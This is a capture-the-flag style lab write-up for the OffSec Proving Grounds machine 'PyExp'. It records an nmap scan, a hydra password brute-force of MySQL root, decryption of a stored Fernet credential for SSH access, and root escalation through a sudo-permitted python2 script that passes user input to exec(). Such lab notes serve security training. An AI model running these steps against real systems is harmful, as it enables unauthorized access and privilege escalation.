---
title: OffSec PG - PyExp
date: 2021-12-19 12:00:00 +0500
categories: [Lab Practice Notes, OffSec Proving Grounds]
tags: [oscp,lab,offsec-proving-grounds]
image:
  path: /assets/img/covers/pg-cover.jpeg
  alt: PG Artwork
---

## Enumeration

Machine IP &rarr; `192.168.63.118`

Nmap scan &rarr; `nmap -A -Pn -p- -T4 -o nmap.txt 192.168.63.118`

OS Detection &rarr;  `OS: Linux; CPE: cpe:/o:linux:linux_kernel`

| **Port** | **Service** | **Other details (if any)**                                           |
| -------- | ----------- | -------------------------------------------------------------------- |
| 1337     | SSH         | OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)                       |
| 3306     | MySQL       | MySQL 5.5.5-10.3.23-MariaDB-0+deb10u1 &rarr; *Salt: **"(APO{@jw7JP3MgBRU_ |

---

## Exploitation

Mysql can be brute-forced for a password for the user root. Used hydra for this as follows &rarr; `hyda -l root -P rockyou.txt -t 4 mysql://192.168.63.118`. The password was `prettywoman`. With the new password, looking at mysql databases using the following &rarr; `mysql -u root -h 192.168.63.118 -p`.

Looking into the mysql shell, the database is `data` and the table is `fernet`. The table has the following entry &rarr;

cred &rarr; `gAAAAABfMbX0bqWJTTdHKUYYG9U5Y6JGCpgEiLqmYIVlWB7t8gvsuayfhLOO_cHnJQF1_ibv14si1MbL7Dgt9Odk8mKHAXLhyHZplax0v02MMzh_z_eI7ys=`

keyy &rarr; `UJ5_V_b-TWKKyzlErA96f-9aEnQEfdjFbRKt8ULjdV0=`

The given key and credentials are not any encoding format such as base64, etc. It is in fact fernet. The `cryptography` module in python has support for the fernet encryption. This can be decoded as follows using a python script &rarr;

```python
from cryptography.fernet import Fernet
decryptor = Fernet(b'UJ5_V_b-TWKKyzlErA96f-9aEnQEfdjFbRKt8ULjdV0=')
plaintext = decryptor.decrypt(b'gAAAAABfMbX0bqWJTTdHKUYYG9U5Y6JGCpgEiLqmYIVlWB7t8gvsuayfhLOO_cHnJQF1_ibv14si1MbL7Dgt9Odk8mKHAXLhyHZplax0v02MMzh_z_eI7ys=')
print(plaintext)
```

Running this as `python3 decrypt.py` gives the output as `b'lucy:wJ9`"Lemdv9[FEw-'`. These can be used as the credentials for ssh running on port 1337. Logging in to ssh with the above credentials gives the user `lucy` with a user flag in the home directory.

---

## Privilege Escalation

For privilege escalation, searched set uid binaries using the following find command &rarr; `find / -perm -u=s -type f 2>/dev/null`. This does show `sudo`. Listing commands that can be run by user `lucy` by using `sudo -l`, the python2 binary can be called for the file `/opt/exp.py`.

The file contains the following code &rarr;

```python
uinput = raw_input('how are you?')
exec(uinput)
```

`exec()` in python2 basically runs python inside it. Therefore, running the above with `sudo /usr/bin/python2 /opt/exp.py` and giving input as `import os; os.system(“whoami“);` returns `root`.

Therefore, a shell could even be spawned by changing the command, which gives the root flag in the `/root/` directory.

---
